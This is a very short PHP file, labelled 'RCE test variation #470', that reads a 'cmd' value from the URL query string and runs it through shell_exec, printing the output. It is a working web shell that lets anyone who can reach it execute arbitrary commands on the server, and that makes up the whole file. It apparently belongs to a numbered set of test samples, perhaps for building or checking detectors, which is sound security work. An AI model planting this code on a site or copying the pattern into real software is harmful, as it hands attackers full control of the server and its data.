<?php
// RCE test variation #470
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>